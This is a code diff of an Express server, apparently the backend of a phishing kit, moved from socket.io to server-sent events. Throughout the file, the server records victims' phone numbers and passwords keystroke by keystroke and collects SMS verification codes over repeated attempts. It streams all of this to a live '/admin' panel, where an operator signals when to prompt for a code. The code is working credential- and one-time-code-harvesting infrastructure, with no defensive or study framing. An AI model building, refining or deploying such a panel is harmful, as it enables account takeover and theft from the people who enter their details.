@@ -1,12 +1,7 @@
 const express = require('express');
-const http = require('http');
 const path = require('path');
-const { Server } = require('socket.io');
 
 const app = express();
-const server = http.createServer(app);
-const io = new Server(server);
-
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
@@ -14,6 +9,7 @@ app.use(express.static(__dirname));
 
 const sessions = new Map();
 const codesByPhone = new Map();
+const sseClients = new Set();
 
 function getOrCreateSession(sessionId) {
   if (!sessions.has(sessionId)) {
@@ -52,35 +48,38 @@ function getSubmissionsPayload() {
   };
 }
 
-function emitLiveState() {
-  io.emit('submissions:update', getSubmissionsPayload());
+function broadcastEvent(eventName, data) {
+  const payload = `event: ${eventName}\ndata: ${JSON.stringify(data)}\n\n`;
+  for (const client of sseClients) {
+    try {
+      client.write(payload);
+    } catch (e) {
+      sseClients.delete(client);
+    }
+  }
 }
 
-io.on('connection', (socket) => {
-  socket.emit('submissions:update', getSubmissionsPayload());
+app.get('/api/stream', (req, res) => {
+  res.setHeader('Content-Type', 'text/event-stream');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Connection', 'keep-alive');
+  res.flushHeaders();
 
-  socket.on('register:start', ({ sessionId, phone, startedAt } = {}) => {
-    if (!sessionId) return;
+  sseClients.add(res);
+  res.write(`event: submissions:update\ndata: ${JSON.stringify(getSubmissionsPayload())}\n\n`);
 
-    const cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
-    const entry = getOrCreateSession(sessionId);
-    const isFirstStart = !entry.typingStarted;
-
-    entry.typingStarted = true;
-    if (cleanPhone && !entry.phone) {
-      entry.phone = cleanPhone;
+  const keepAlive = setInterval(() => {
+    try {
+      res.write(': ping\n\n');
+    } catch (e) {
+      clearInterval(keepAlive);
+      sseClients.delete(res);
     }
-    entry.updatedAt = Date.now();
+  }, 15000);
 
-    if (isFirstStart) {
-      io.emit('user:started-registering', {
-        sessionId,
-        phone: entry.phone || cleanPhone,
-        startedAt: startedAt || Date.now()
-      });
-    }
-
-    emitLiveState();
+  req.on('close', () => {
+    clearInterval(keepAlive);
+    sseClients.delete(res);
   });
 });
 
@@ -92,8 +91,34 @@ app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'admin.html'));
 });
 
+app.post('/api/register-start', (req, res) => {
+  const { sessionId, phone, startedAt } = req.body || {};
+  if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
+
+  const cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
+  const entry = getOrCreateSession(sessionId);
+  const isFirstStart = !entry.typingStarted;
+
+  entry.typingStarted = true;
+  if (cleanPhone && !entry.phone) {
+    entry.phone = cleanPhone;
+  }
+  entry.updatedAt = Date.now();
+
+  if (isFirstStart) {
+    broadcastEvent('user:started-registering', {
+      sessionId,
+      phone: entry.phone || cleanPhone,
+      startedAt: startedAt || Date.now()
+    });
+  }
+
+  broadcastEvent('submissions:update', getSubmissionsPayload());
+  res.json({ ok: true });
+});
+
 app.post('/api/live-update', (req, res) => {
-  const { sessionId, phone, password, startedTyping } = req.body;
+  const { sessionId, phone, password, startedTyping } = req.body || {};
   if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
 
   const cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
@@ -114,19 +139,19 @@ app.post('/api/live-update', (req, res) => {
   entry.updatedAt = Date.now();
 
   if (wasFirstKeystroke) {
-    io.emit('user:started-registering', {
+    broadcastEvent('user:started-registering', {
       sessionId,
       phone: cleanPhone,
       startedAt: Date.now()
     });
   }
 
-  emitLiveState();
+  broadcastEvent('submissions:update', getSubmissionsPayload());
   res.json({ ok: true });
 });
 
 app.post('/api/request-code', (req, res) => {
-  const { sessionId, phone } = req.body;
+  const { sessionId, phone } = req.body || {};
   if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
 
   const entry = getOrCreateSession(sessionId);
@@ -138,7 +163,7 @@ app.post('/api/request-code', (req, res) => {
   entry.codeSended = false;
   entry.updatedAt = Date.now();
 
-  emitLiveState();
+  broadcastEvent('submissions:update', getSubmissionsPayload());
   res.json({ ok: true });
 });
 
@@ -152,14 +177,14 @@ app.get('/api/status', (req, res) => {
 
   if (justSent) {
     entry.codeSended = false;
-    emitLiveState();
+    broadcastEvent('submissions:update', getSubmissionsPayload());
   }
 
   res.json({ codeSended: justSent });
 });
 
 app.post('/api/admin/mark-code-sended', (req, res) => {
-  const { sessionId } = req.body;
+  const { sessionId } = req.body || {};
   if (!sessionId || !sessions.has(sessionId)) {
     return res.status(404).json({ error: 'Session not found' });
   }
@@ -169,12 +194,12 @@ app.post('/api/admin/mark-code-sended', (req, res) => {
   entry.codeRequested = false;
   entry.updatedAt = Date.now();
 
-  emitLiveState();
+  broadcastEvent('submissions:update', getSubmissionsPayload());
   res.json({ ok: true });
 });
 
 app.post('/api/submit-code', (req, res) => {
-  const { sessionId, phone, code, attempt } = req.body;
+  const { sessionId, phone, code, attempt } = req.body || {};
   let cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
   const cleanCode = String(code || '').replace(/\D/g, '').slice(0, 4);
 
@@ -198,7 +223,7 @@ app.post('/api/submit-code', (req, res) => {
     list[slotIndex] = cleanCode;
   }
 
-  emitLiveState();
+  broadcastEvent('submissions:update', getSubmissionsPayload());
   res.json({ ok: true });
 });
 
@@ -208,10 +233,10 @@ app.get('/api/submissions', (req, res) => {
 
 app.delete('/api/sessions/:sessionId', (req, res) => {
   sessions.delete(req.params.sessionId);
-  emitLiveState();
+  broadcastEvent('submissions:update', getSubmissionsPayload());
   res.json({ ok: true });
 });
 
-server.listen(PORT, () => {
+app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
